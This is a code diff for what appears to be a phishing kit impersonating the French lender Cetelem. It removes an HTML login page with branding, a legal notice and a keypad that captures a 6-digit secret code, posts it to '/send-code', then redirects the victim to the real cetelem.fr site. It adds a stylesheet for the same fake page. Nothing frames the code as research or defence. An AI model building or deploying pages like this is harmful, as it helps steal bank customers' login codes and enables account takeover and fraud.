@@ -1,219 +1,158 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Connexion sécurisée</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #c0d4cd;
-      margin: 0;
-      padding: 0;
-    }
+@media (min-width: 768px) {
+  .main-container {
+    width: 66.6667%;
+  }
+}
 
-    .logo {
-      text-align: center;
-      padding-top: 20px;
-      font-size: 28px;
-      font-weight: bold;
-      color: #1b5e20;
-    }
+body {
+  font-family: "Segoe UI", Arial, sans-serif;
+  background-color: #c0d4cd;
+  margin: 0;
+  padding: 0;
+}
 
-    .legal {
-      text-align: center;
-      font-size: 13px;
-      color: #333;
-      margin: 10px 20px;
-    }
+.logo {
+  text-align: center;
+  padding-top: 20px;
+  font-size: 28px;
+  font-weight: bold;
+  color: #1b5e20;
+}
 
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 20px;
-    }
+.legal {
+  text-align: center;
+  font-size: 13px;
+  color: #333;
+  margin: 10px 20px;
+}
 
-    .login-box {
-      background-color: #fff;
-      padding: 30px 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-      text-align: center;
-      max-width: 350px;
-      width: 100%;
-    }
+.container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 20px;
+}
 
-    .back-link {
-      align-self: flex-start;
-      margin: 10px;
-      color: #014421;
-      font-weight: bold;
-      text-decoration: none;
-    }
+.login-box {
+  background-color: #fff;
+  padding: 30px 20px;
+  border-radius: 8px;
+  box-shadow: 0 0 8px rgba(0,0,0,0.1);
+  text-align: center;
+  max-width: 350px;
+  width: 100%;
+  position: relative;
+}
 
-    .avatar {
-      font-size: 40px;
-    }
+.back-link {
+  display: inline-block;
+  text-align: left;
+  margin-bottom: 15px;
+  margin-left: 0;
+  color: #014421;
+  font-weight: bold;
+  text-decoration: none;
+  position: absolute;
+  top: 15px;
+  left: 20px;
+}
 
-    .masked-id {
-      margin-top: 8px;
-      font-size: 14px;
-      color: #444;
-    }
+.avatar {
+  font-size: 40px;
+}
 
-    h2 {
-      margin: 15px 0;
-      font-size: 18px;
-      font-weight: bold;
-    }
+.masked-id {
+  margin-top: 8px;
+  font-size: 14px;
+  color: #444;
+}
 
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 18px;
-      text-align: center;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      letter-spacing: 4px;
-      margin-bottom: 15px;
-    }
+h2 {
+  margin: 15px 0;
+  font-size: 18px;
+  font-weight: bold;
+}
 
-    .keypad {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 10px;
-      margin-bottom: 20px;
-    }
+input[type="password"] {
+  width: 100%;
+  padding: 10px;
+  font-size: 18px;
+  text-align: center;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  letter-spacing: 4px;
+  margin-bottom: 15px;
+  transition: all 0.2s ease-in-out;
+}
 
-    .keypad button {
-      background-color: #0a4d3c;
-      color: white;
-      font-size: 18px;
-      border: none;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      cursor: pointer;
-    }
+.keypad {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr); /* 5 colonnes */
+  gap: 10px; /* Réduit l’écart entre les boutons */
+  justify-content: center;
+  align-items: center;
+  padding: 10px 0;
+  max-width: 300px; /* Limite la largeur totale */
+  margin: 0 auto; /* Centre horizontalement */
+}
 
-    .submit-btn {
-      width: 100%;
-      background-color: #a5abad;
-      color: white;
-      padding: 10px;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
 
-    .forgot-link {
-      display: block;
-      margin-top: 10px;
-      color: #014421;
-      font-size: 13px;
-      text-decoration: underline;
-    }
+.keypad button {
+  width: 50px;     /* Taille plus compacte */
+  height: 50px;
+  border-radius: 50%;
+  background-color: #004d40;
+  color: white;
+  font-size: 18px;
+  border: none;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
 
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      font-size: 12px;
-    }
 
-    .footer-links a {
-      color: #000;
-      text-decoration: none;
-      margin: 0 5px;
-    }
+.submit-btn {
+  width: 100%;
+  background-color: #a5abad;
+  color: white;
+  padding: 10px;
+  font-size: 16px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
 
-    .footer-social {
-      margin-top: 10px;
-      font-size: 20px;
-    }
-  </style>
-</head>
-<body>
+.submit-btn:enabled {
+  background-color: #1b5e20;
+}
 
-  <div class="logo">cetelem</div>
-  <div class="legal">
-    Un crédit vous engage et doit être remboursé.<br>
-    Vérifiez vos capacités de remboursement avant de vous engager.
-  </div>
+.submit-btn:enabled:hover {
+  background-color: #145c17;
+}
 
-  <div class="container">
-    <a href="#" class="back-link">Retour</a>
-    <div class="login-box">
-      <div class="avatar">👤</div>
-      <div class="masked-id">***********</div>
-      <h2>Accéder à mon espace sécurisé</h2>
-      <input type="password" id="codeInput" maxlength="6" readonly>
+.forgot-link {
+  display: block;
+  margin-top: 10px;
+  color: #014421;
+  font-size: 13px;
+  text-decoration: underline;
+}
 
-      <div class="keypad">
-        <button>1</button><button>2</button><button>3</button><button>C</button>
-        <button>4</button><button>5</button><button>6</button><button>←</button>
-        <button>7</button><button>8</button><button>9</button><button>0</button>
-      </div>
+footer {
+  text-align: center;
+  margin-top: 40px;
+  font-size: 12px;
+}
 
-      <button id="submitBtn" class="submit-btn">Je me connecte</button>
-      <a href="#" class="forgot-link">Code secret oublié ?</a>
-    </div>
+.footer-links a {
+  color: #000;
+  text-decoration: none;
+  margin: 0 5px;
+}
 
-    <footer>
-      <div class="footer-links">
-        <a href="#">Virement express</a> |
-        <a href="#">Résiliation</a> |
-        <a href="#">Contact</a> |
-        <a href="#">Mentions légales</a> |
-        <a href="#">Préférences de cookies</a>
-      </div>
-      <div class="footer-social">
-        <span>🔘</span> <span>🎬</span>
-      </div>
-    </footer>
-  </div>
-
-  <script>
-    let code = "";
-
-    document.querySelectorAll(".keypad button").forEach(button => {
-      button.addEventListener("click", () => {
-        const val = button.textContent;
-
-        if (!isNaN(val) && code.length < 6) {
-          code += val;
-        } else if (val === "←") {
-          code = code.slice(0, -1);
-        } else if (val === "C") {
-          code = "";
-        }
-
-        document.getElementById("codeInput").value = "*".repeat(code.length);
-      });
-    });
-
-    document.getElementById("submitBtn").addEventListener("click", async () => {
-      if (code.length !== 6 || isNaN(code)) {
-        alert("Veuillez entrer un code à 6 chiffres.");
-        return;
-      }
-
-      try {
-        await fetch("/send-code", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ code })
-        });
-
-        window.location.href = "https://www.cetelem.fr/fr/accueil";
-      } catch (error) {
-        alert("Erreur lors de l'envoi.");
-        console.error(error);
-      }
-    });
-  </script>
-</body>
-</html>
+.footer-social {
+  margin-top: 10px;
+  font-size: 20px;
+}
